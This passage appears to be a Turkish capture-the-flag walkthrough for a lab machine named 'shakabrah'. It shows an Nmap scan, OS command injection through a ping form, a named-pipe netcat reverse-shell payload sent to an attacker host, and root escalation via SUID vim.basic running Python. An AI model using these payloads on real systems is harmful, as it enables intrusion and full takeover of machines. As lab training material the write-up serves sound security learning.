@@ -1,0 +1,86 @@
+      ####Enumeration
+
+      ####Nmap
+Numaralandırma işlemine basit bir Nmap tarama ile başlıyoruz:
+kali@kali:~$ sudo nmap $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-14 03:54 EDT
+Nmap scan report for $targetip
+Host is up (0.00041s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+      ####Web Enumeration
+80 numaralı bağlantı noktasının açık olduğunu görüyoruz ve ilk adım olarak tarayıcımızda ziyaret ediyoruz. 
+Sayfada, bir ana bilgisayar belirtmemize ve sunucunun o ana bilgisayara bağlantısını doğrulamamıza izin veren bir form buluyoruz. Sunucunun .ping komutunu localhost çalıştırdığını gösteren aşağıdaki çıktıyı görüyoruz 
+PING localhost (127.0.0.1) 56(84) bytes of data.
+64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.022 ms
+64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.056 ms
+64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.057 ms
+64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.042 ms
+
+--- localhost ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3070ms
+rtt min/avg/max/mdev = 0.022/0.044/0.057/0.014 ms
+
+      ####Exploitation
+
+      ####İşletim Sistemi Komut Enjeksiyonu
+Sunucu, belirttiğimiz ana bilgisayarı ping -c 4 dizesi ile birleştiriyor ve ardından bir shell aracılığıyla yürütüyor gibi görünüyor. Uygun doğrulama veya temizleme işlemi gerçekleştirilmezse, kendi komutlarımızı enjekte ederek bundan yararlanabiliriz.
+id Aşağıdaki yükü kullanarak komutu çalıştırmayı deneyerek bunu doğrulayacağız : ;id. Noktalı virgül'den  sonra id komutunu çalıştırmamıza izin veren Bash komut ayırıcısıdır . 
+ping Aşağıdaki çıktı, varsayımımızın doğru olduğunu ve istediğimiz herhangi bir işletim sistemi komutunu enjekte edip uygulayabileceğimizi gösteriyor.
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Bundan yararlanmak için, önce ters kabuğumuzu yakalamak için 80 numaralı bağlantı noktasını dinleyen bir Netcat işleyicisi başlatacağız:
+kali@kali:~$ sudo nc -lvp 80
+listening on [any] 80 ...
+Ardından, bağlantı doğrulama web sitesine bir ters kabuk içeren aşağıdaki yükü göndeririz:
+;rm -f /tmp/x; mkfifo /tmp/x; /bin/sh -c "cat /tmp/x | /bin/sh -i 2>&1 | nc $attackerip 80 > /tmp/x"
+Daha sonra ters kabuğumuzu yakalarız ve Python kullanarak tam bir TTY'ye yükseltiriz:
+kali@kali:~$ sudo nc -lvp 80
+listening on [any] 80 ...
+$targetip: inverse host lookup failed: Unknown host
+connect to [$attackerip] from (UNKNOWN) [$targetip] 55428
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@shakabrah:/var/www/html$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@shakabrah:/var/www/html$
+
+
+      ####SUID
+Ayrıcalığımızı root olarak yükseltmek için önce sistemdeki tüm SUID ikili dosyalarını numaralandıracağız.
+www-data@shakabrah:/var/www/html$ find / -perm -4000 2> /dev/null
+find / -perm -4000 2> /dev/null
+/bin/mount
+/bin/su
+/bin/ping
+/bin/umount
+/bin/fusermount
+...
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/vim.basic
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+İhtiyaçlarımıza tam olarak uyması gereken bir ikili /usr/bin/vim.basic . Bunu şu şekilde kullanabiliriz:
+www-data@shakabrah:/var/www/html$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "/bin/bash")'
+<; os.setuid(0); os.execl("/bin/bash", "/bin/bash")'
+Vim'in tam olarak işlevsel olmayan terminalimizle yaşadığı bazı mücadeleleri atladıktan sonra, gerçekten root olarak erişim elde ettiğimizi görebiliriz .
+root@shakabrah:/var/www/html# id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+root@shakabrah:/var/www/html#
